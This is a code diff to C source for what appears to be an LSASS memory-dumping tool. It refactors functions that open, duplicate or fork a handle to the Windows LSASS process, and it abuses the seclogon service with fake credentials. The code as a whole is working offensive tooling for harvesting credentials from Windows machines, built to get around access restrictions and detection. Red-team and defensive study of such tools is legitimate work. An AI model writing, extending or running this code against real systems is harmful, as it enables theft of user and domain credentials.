@@ -1,11 +1,13 @@
+#include "../include/utils.h"
 #include "../include/handle.h"
 #include "../include/modules.h"
 #include "../include/malseclogon.h"
 
 HANDLE obtain_lsass_handle(
     DWORD pid,
-    BOOL fork,
+    DWORD permissions,
     BOOL dup,
+    BOOL fork,
     BOOL is_seclogon_stage_2,
     LPCSTR dump_name
 )
@@ -16,29 +18,25 @@ HANDLE obtain_lsass_handle(
         // this is always done from an EXE
 #ifndef BOF
         hProcess = seclogon_stage_2(
-            dump_name
+            dump_name,
+            fork
         );
         // give LSASS a moment to process the new (fake) credentials
         sleep(5);
 #endif
     }
-    else if (fork)
-    {
-        hProcess = fork_lsass_process(
-            pid
-        );
-    }
     else if (dup)
     {
         hProcess = duplicate_lsass_handle(
-            pid
+            pid,
+            permissions
         );
     }
     else if (pid)
     {
         hProcess = get_process_handle(
             pid,
-            LSASS_PERMISSIONS,
+            permissions,
             FALSE
         );
     }
@@ -46,7 +44,7 @@ HANDLE obtain_lsass_handle(
     {
         // this shouldn't happen
         hProcess = find_lsass(
-            LSASS_PERMISSIONS
+            permissions
         );
     }
     return hProcess;
@@ -320,7 +318,7 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
 #else
             printf(
 #endif
-                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
+                "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
                 BufferLength,
                 GetLastError()
             );
@@ -387,7 +385,8 @@ BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
 }
 
 HANDLE duplicate_lsass_handle(
-    DWORD lsass_pid
+    DWORD lsass_pid,
+    DWORD permissions
 )
 {
     NTSTATUS status;
@@ -438,7 +437,7 @@ HANDLE duplicate_lsass_handle(
                 continue;
 
             // make sure the handle has the permissions we need
-            if ((handleInfo->GrantedAccess & (LSASS_PERMISSIONS)) != (LSASS_PERMISSIONS))
+            if ((handleInfo->GrantedAccess & (permissions)) != (permissions))
                 continue;
 
             // make sure the handle is of type 'Process'
@@ -464,7 +463,7 @@ HANDLE duplicate_lsass_handle(
                 (HANDLE)(DWORD_PTR)handleInfo->HandleValue,
                 NtCurrentProcess(),
                 &hDuped,
-                LSASS_PERMISSIONS,
+                permissions,
                 0,
                 0
             );
@@ -510,17 +509,25 @@ HANDLE duplicate_lsass_handle(
 }
 
 HANDLE fork_lsass_process(
-    DWORD dwPid
+    DWORD dwPid,
+    HANDLE hProcess
 )
 {
-    // open handle to LSASS with PROCESS_CREATE_PROCESS
-    HANDLE hProcess = get_process_handle(
-        dwPid,
-        PROCESS_CREATE_PROCESS,
-        FALSE
-    );
-    if (!hProcess)
+    // this function can be call with a PID or an existing handle
+    if (!dwPid && !hProcess)
         return NULL;
+
+    if (dwPid && !hProcess)
+    {
+        // called with a PID, open handle to LSASS with PROCESS_CREATE_PROCESS
+        hProcess = get_process_handle(
+            dwPid,
+            PROCESS_CREATE_PROCESS,
+            FALSE
+        );
+        if (!hProcess)
+            return NULL;
+    }
 
     // fork the LSASS process
     HANDLE hCloneProcess = NULL;
@@ -544,8 +551,6 @@ HANDLE fork_lsass_process(
         NULL,
         NULL
     );
-    NtClose(hProcess); hProcess = NULL;
-
     if (!NT_SUCCESS(status))
     {
 #ifdef DEBUG
@@ -558,8 +563,10 @@ HANDLE fork_lsass_process(
             status
         );
 #endif
-        return NULL;
+        // process forking failed
+        hCloneProcess = NULL;
     }
 
+    NtClose(hProcess); hProcess = NULL;
     return hCloneProcess;
 }
